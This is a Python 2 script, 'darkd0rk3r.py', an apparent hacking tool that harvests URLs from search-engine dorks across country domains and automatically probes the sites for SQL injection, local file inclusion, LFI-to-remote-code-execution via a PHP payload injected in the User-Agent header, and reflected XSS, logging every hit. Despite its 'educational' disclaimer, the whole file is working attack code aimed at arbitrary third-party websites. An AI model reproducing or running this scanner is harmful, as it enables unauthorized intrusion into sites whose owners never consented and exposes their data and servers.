#!/usr/bin/python
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will be not responsible for any damage!
# !!! Special greetz for my friend sinner_01 !!!
# Toolname        : darkd0rk3r.py
# Coder           : baltazar a.k.a b4ltazar < b4ltazar@gmail.com>
# Version         : 0.7
# Greetz for rsauron and low1z, great python coders
# greetz for d3hydr8, r45c4l, qk, fx0, Soul, MikiSoft, c0ax, b0ne, tek0t and all members of ex darkc0de.com, ljuska.org 
# 

import string, sys, time, urllib2, cookielib, re, random, threading, socket, os, subprocess
from random import choice

# Colours
W  = "\033[0m";  
R  = "\033[31m"; 
G  = "\033[32m"; 
O  = "\033[33m"; 
B  = "\033[34m";

# Banner
def logo():
	print R+"\n|---------------------------------------------------------------|"
        print "| b4ltazar[@]gmail[dot]com                                      |"
        print "|   02/2012     darkd0rk3r.py  v.0.7                            |"
        print "|    b4ltazar.wordpress.com    &   ljuska.org                   |"
        print "|                                                               |"
        print "|---------------------------------------------------------------|\n"
	print W

if sys.platform == 'linux' or sys.platform == 'linux2':
  subprocess.call("clear", shell=True)
  logo()

else:
  subprocess.call("cls", shell=True)
  logo()

log = "darkd0rk3r-sqli.txt"
logfile = open(log, "a")
lfi_log = "darkd0rk3r-lfi.txt"
lfi_log_file = open(lfi_log, "a")
rce_log = "darkd0rk3r-rce.txt"
rce_log_file = open(rce_log, "a")
xss_log = "darkd0rk3r-xss.txt"
xss_log_file = open(xss_log, "a")

threads = []
finallist = []
vuln = []
timeout = 300
socket.setdefaulttimeout(timeout)

lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]

xsses = ["<h1>XSS by baltazar</h1>","%3Ch1%3EXSS%20by%20baltazar%3C/h1%3E"]

sqlerrors = {'MySQL': 'error in your SQL syntax',
             'MiscError': 'mysql_fetch',
             'MiscError2': 'num_rows',
             'Oracle': 'ORA-01756',
             'JDBC_CFM': 'Error Executing Database Query',
             'JDBC_CFM2': 'SQLServer JDBC Driver',
             'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
             'MSSQL_Uqm': 'Unclosed quotation mark',
             'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
             'MS-Access_JETdb': 'Microsoft JET Database',
             'Error Occurred While Processing Request' : 'Error Occurred While Processing Request',
             'Server Error' : 'Server Error',
             'Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error',
             'Invalid Querystring' : 'Invalid Querystring',
             'OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC',
             'VBScript Runtime' : 'VBScript Runtime',
             'ADODB.Field' : 'ADODB.Field',
             'BOF or EOF' : 'BOF or EOF',
             'ADODB.Command' : 'ADODB.Command',
             'JET Database' : 'JET Database',
             'mysql_fetch_array()' : 'mysql_fetch_array()',
             'Syntax error' : 'Syntax error',
             'mysql_numrows()' : 'mysql_numrows()',
             'GetArray()' : 'GetArray()',
             'FetchRow()' : 'FetchRow()',
             'Input string was not in a correct format' : 'Input string was not in a correct format',
             'Not found' : 'Not found'}

header = ['Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.10 sun4u; X11)',
          'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.2pre) Gecko/20100207 Ubuntu/9.04 (jaunty) Namoroka/3.6.2pre',
          'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser;',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)',
	  'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)',
	  'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)',
	  'Microsoft Internet Explorer/4.0b1 (Windows 95)',
	  'Opera/8.00 (Windows NT 5.1; U; en)',
	  'amaya/9.51 libwww/5.4.0',
	  'Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)',
	  'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	  'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; ZoomSpider.net bot; .NET CLR 1.1.4322)',
	  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; QihooBot 1.0 qihoobot@qihoo.net)',
	  'Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]']

domains = {'All domains':['ac', 'ad', 'ae', 'af', 'ag', 'ai', 'al', 'am', 'an', 'ao',
           'aq', 'ar', 'as', 'at', 'au', 'aw', 'ax', 'az', 'ba', 'bb',
           'bd', 'be', 'bf', 'bg', 'bh', 'bi', 'bj', 'bm', 'bn', 'bo',
           'br', 'bs', 'bt', 'bv', 'bw', 'by', 'bz', 'ca', 'cc', 'cd',
           'cf', 'cg', 'ch', 'ci', 'ck', 'cl', 'cm', 'cn', 'co', 'cr',
           'cu', 'cv', 'cx', 'cy', 'cz', 'de', 'dj', 'dk', 'dm', 'do',
           'dz', 'ec', 'ee', 'eg', 'eh', 'er', 'es', 'et', 'eu', 'fi',
           'fj', 'fk', 'fm', 'fo', 'fr', 'ga', 'gb', 'gd', 'ge', 'gf',
           'gg', 'gh', 'gi', 'gl', 'gm', 'gn', 'gp', 'gq', 'gr', 'gs',
           'gt', 'gu', 'gw', 'gy', 'hk', 'hm', 'hn', 'hr', 'ht', 'hu',
           'id', 'ie', 'il', 'im', 'in', 'io', 'iq', 'ir', 'is', 'it',
           'je', 'jm', 'jo', 'jp', 'ke', 'kg', 'kh', 'ki', 'km', 'kn',
           'kp', 'kr', 'kw', 'ky', 'kz', 'la', 'lb', 'lc', 'li', 'lk',
           'lr', 'ls', 'lt', 'lu', 'lv', 'ly', 'ma', 'mc', 'md', 'me',
           'mg', 'mh', 'mk', 'ml', 'mm', 'mn', 'mo', 'mp', 'mq', 'mr',
           'ms', 'mt', 'mu', 'mv', 'mw', 'mx', 'my', 'mz', 'na', 'nc',
           'ne', 'nf', 'ng', 'ni', 'nl', 'no', 'np', 'nr', 'nu', 'nz',
           'om', 'pa', 'pe', 'pf', 'pg', 'ph', 'pk', 'pl', 'pm', 'pn',
           'pr', 'ps', 'pt', 'pw', 'py', 'qa', 're', 'ro', 'rs', 'ru',
           'rw', 'sa', 'sb', 'sc', 'sd', 'se', 'sg', 'sh', 'si', 'sj',
           'sk', 'sl', 'sm', 'sn', 'so', 'sr', 'st', 'su', 'sv', 'sy',
           'sz', 'tc', 'td', 'tf', 'tg', 'th', 'tj', 'tk', 'tl', 'tm',
           'tn', 'to', 'tp', 'tr', 'tt', 'tv', 'tw', 'tz', 'ua', 'ug',
           'uk', 'um', 'us', 'uy', 'uz', 'va', 'vc', 've', 'vg', 'vi',
           'vn', 'vu', 'wf', 'ws', 'ye', 'yt', 'za', 'zm', 'zw', 'com',
           'net', 'org','biz', 'gov', 'mil', 'edu', 'info', 'int', 'tel',
           'name', 'aero', 'asia', 'cat', 'coop', 'jobs', 'mobi', 'museum',
           'pro', 'travel'],'Balcan':['al', 'bg', 'ro', 'gr', 'rs', 'hr',
           'tr', 'ba', 'mk', 'mv', 'me'],'TLD':['xxx','edu', 'gov', 'mil',
           'biz', 'cat', 'com', 'int','net', 'org', 'pro', 'tel', 'aero', 'asia',
           'coop', 'info', 'jobs', 'mobi', 'name', 'museum', 'travel']}

stecnt = 0
for k,v in domains.items():
  stecnt += 1
  print str(stecnt)+" - "+k
sitekey = raw_input("\nChoose your target   : ")
sitearray = domains[domains.keys()[int(sitekey)-1]]

inurl = raw_input('\nEnter your dork      : ')
numthreads = raw_input('Enter no. of threads : ')
maxc = raw_input('Enter no. of pages   : ')
print "\nNumber of SQL errors :",len(sqlerrors)
print "Number of LFI paths  :",len(lfis)
print "Number of XSS cheats :",len(xsses)
print "Number of headers    :",len(header)
print "Number of threads    :",numthreads
print "Number of pages      :",maxc
print "Timeout in seconds   :",timeout
print ""

def search(inurl, maxc):
  urls = []
  for site in sitearray:
    page = 0
    try:
      while page < int(maxc):
	jar = cookielib.FileCookieJar("cookies")
	query = inurl+"+site:"+site
	results_web = 'http://www.search-results.com/web?q='+query+'&hl=en&page='+repr(page)+'&src=hmp'
	request_web =urllib2.Request(results_web)
	agent = random.choice(header)
	request_web.add_header('User-Agent', agent)
	opener_web = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
	text = opener_web.open(request_web).read()
	stringreg = re.compile('(?<=href=")(.*?)(?=")')
        names = stringreg.findall(text)
        page += 1
        for name in names:
	  if name not in urls:
	    if re.search(r'\(',name) or re.search("<", name) or re.search("\A/", name) or re.search("\A(http://)\d", name):
	      pass
	    elif re.search("google",name) or re.search("youtube", name) or re.search("phpbuddy", name) or re.search("iranhack",name) or re.search("phpbuilder",name) or re.search("codingforums", name) or re.search("phpfreaks", name) or re.search("%", name) or re.search("facebook", name) or re.search("twitter", name):
	      pass
	    else:
	      urls.append(name)
	percent = int((1.0*page/int(maxc))*100)
	urls_len = len(urls)
	sys.stdout.write("\rSite: %s | Collected urls: %s | Percent Done: %s | Current page no.: %s <> " % (site,repr(urls_len),repr(percent),repr(page)))
	sys.stdout.flush()
    except(KeyboardInterrupt):
      pass
  tmplist = []
  print "\n\n[+] URLS (unsorted): ",len(urls)
  for url in urls:
    try:
      host = url.split("/",3)
      domain = host[2]
      if domain not in tmplist and "=" in url:
	finallist.append(url)
	tmplist.append(domain)

    except:
      pass
  print "[+] URLS (sorted)  : ",len(finallist)
  return finallist

class injThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicINJ(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

class lfiThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicLFI(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

class xssThread(threading.Thread):
        def __init__(self,hosts):
                self.hosts=hosts
                self.fcount = 0
                self.check = True
                threading.Thread.__init__(self)

        def run (self):
                urls = list(self.hosts)
                for url in urls:
                        try:
                                if self.check == True:
                                        ClassicXSS(url)
                                else:
                                        break
                        except(KeyboardInterrupt,ValueError):
                                pass
                self.fcount+=1

        def stop(self):
                self.check = False

def ClassicINJ(url):
        EXT = "'"
        host = url+EXT
        try:
                source = urllib2.urlopen(host).read()
                for type,eMSG in sqlerrors.items():
                        if re.search(eMSG, source):
                                print R+"[!] w00t!,w00t!:", O+host, B+"Error:", type,R+" ---> SQL Injection Found"
				logfile.write("\n"+host)
				vuln.append(host)

                        else:
                                pass
        except:
                pass

def ClassicLFI(url):
  lfiurl = url.rsplit('=', 1)[0]
  if lfiurl[-1] != "=":
    lfiurl = lfiurl + "="
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("\n", "")).read()
      if re.findall("root:x", check):
	print R+"[!] w00t!,w00t!: ", O+lfiurl+lfi,R+" ---> Local File Include Found"
	lfi_log_file.write("\n"+lfiurl+lfi)
	vuln.append(lfiurl+lfi)
	target = lfiurl+lfi
	target = target.replace("/etc/passwd","/proc/self/environ")
	header = "<? echo md5(baltazar); ?>"
        try:
	  request_web = urllib2.Request(target)
	  request_web.add_header('User-Agent', header)
	  text = urllib2.urlopen(request_web)
	  text = text.read()
	  if re.findall("f17f4b3e8e709cd3c89a6dbd949d7171", text):
	    print R+"[!] w00t!,w00t!: ",O+target,R+" ---> LFI to RCE Found"
	    rce_log_file.write("\n",target)
	    vuln.append(target)
        except:
	  pass

    except:
      pass

def ClassicXSS(url):
  for xss in xsses:
    try:
      source = urllib2.urlopen(url+xss.replace("\n","")).read()
      if re.findall("XSS by baltazar", source):
	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
	xss_log_file.write("\n"+url+xss)
	vuln.append(url+xss)
    except:
      pass

def injtest():
  print B+"\n[+] Preparing for SQLi scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = injThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

def lfitest():
  print B+"\n[+] Preparing for LFI - RCE scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = lfiThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

def xsstest():
  print B+"\n[+] Preparing for XSS scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...\n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
  z = 0
  if len(threads) <= numthreads:
    for x in range(0, int(numthreads)):
      sliced = usearch[x*i:(x+1)*i]
      if (z<m):
	sliced.append(usearch[int(numthreads)*i+z])
	z +=1
      thread = xssThread(sliced)
      thread.start()
      threads.append(thread)
    for thread in threads:
      thread.join()

usearch = search(inurl,maxc)
menu = True
while menu == True:
  print R+"\n[1] SQLi Testing"
  print "[2] LFI - RCE Testing"
  print "[3] XSS Testing"
  print "[4] SQLi and LFI - RCE Testing"
  print "[5] SQLi and XSS Testing"
  print "[6] LFI -RCE and XSS Testing"
  print "[7] SQLi,LFI - RCE and XSS Testing"
  print "[8] Save valid urls to file"
  print "[9] Print valid urls"
  print "[10] Found vuln in last scan"
  print "[0] Exit\n"
  chce = raw_input(":")
  if chce == '1':
    injtest()

  if chce == '2':
    lfitest()

  if chce == '3':
    xsstest()

  if chce == '4':
    injtest()
    lfitest()

  if chce == '5':
    injtest()
    xsstest()

  if chce == '6':
    lfitest()
    xsstest()

  if chce == '7':
    injtest()
    lfitest()
    xsstest()

  if chce == '8':
    print B+"\nSaving valid urls ("+str(len(finallist))+") to file"
    listname = raw_input("Filename: ")
    list_name = open(listname, "w")
    finallist.sort()
    for t in finallist:
      list_name.write(t+"\n")
    list_name.close()
    print "Urls saved, please check", listname

  if chce == '9':
    print W+"\nPrinting valid urls:\n"
    finallist.sort()
    for t in finallist:
      print B+t

  if chce == '10':
    print B+"\nVuln found ",len(vuln)

  if chce == '0':
    print R+"\n[-] Exiting ..."
    mnu = False
    sys.exit(1)